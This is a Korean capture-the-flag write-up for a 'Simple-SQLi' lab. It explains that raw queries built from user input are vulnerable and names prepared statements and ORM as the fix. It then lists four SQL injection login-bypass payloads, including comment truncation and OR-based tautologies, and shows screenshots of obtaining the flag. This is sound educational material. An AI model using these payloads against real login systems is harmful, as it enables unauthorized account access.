# 함께 실습 SQL Injection

Simple-SQLi 문제 풀이 접근 방법

1) 관리자 계정의 비밀번호를 모른채로 로그인을 우회하여 풀이하는 방법 → 해당 방법으로 진행

2) 관리자 계정의 비밀번호를 알아내고 올바른 경로로 로그인하는 방법

`query_db` 함수 : 동적으로 생성한 쿼리이며 이러한 쿼리를  RawQuery라고 함. **RawQuery를 생성할 때, 이용자의 입력값이 쿼리문에 포함되면 SQL Injection 취약점에 노출될 수 있음.**

해결 방법: SQL 데이터를 처리할 때 쿼리문을 직접 생성하는 방식이 아닌 **Prepared Statement**
와 **Object Relational Mapping (ORM)**을 사용하여 해결 가능. Prepared Statement는 동적 쿼리가 전달되면 내부적으로 쿼리 분석을 수행해 안전한 쿼리문을 생성.

**로그인 쿼리**

```jsx
SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";
```

**SQL Injection 공격 쿼리문 작성**

```jsx
/*
ID: admin, PW: DUMMY
userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식
*/
SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"
/*
ID: admin" or "1 , PW: DUMMY
userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
*/
SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"
/*
ID: admin, PW: DUMMY" or userid="admin
userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식
*/
SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"
/*
ID: " or 1 LIMIT 1,1-- , PW: DUMMY
userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식
*/
SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"
```

---

# Simple_sqli

1. 로그인 공격 쿼리 입력
    
    ![Untitled](%E1%84%92%E1%85%A1%E1%86%B7%E1%84%81%E1%85%A6%20%E1%84%89%E1%85%B5%E1%86%AF%E1%84%89%E1%85%B3%E1%86%B8%20SQL%20Injection%204ae9b7d719eb482eb65d335404c21d17/Untitled.png)
    
2. flag 획득
    
    ![Untitled](%E1%84%92%E1%85%A1%E1%86%B7%E1%84%81%E1%85%A6%20%E1%84%89%E1%85%B5%E1%86%AF%E1%84%89%E1%85%B3%E1%86%B8%20SQL%20Injection%204ae9b7d719eb482eb65d335404c21d17/Untitled%201.png)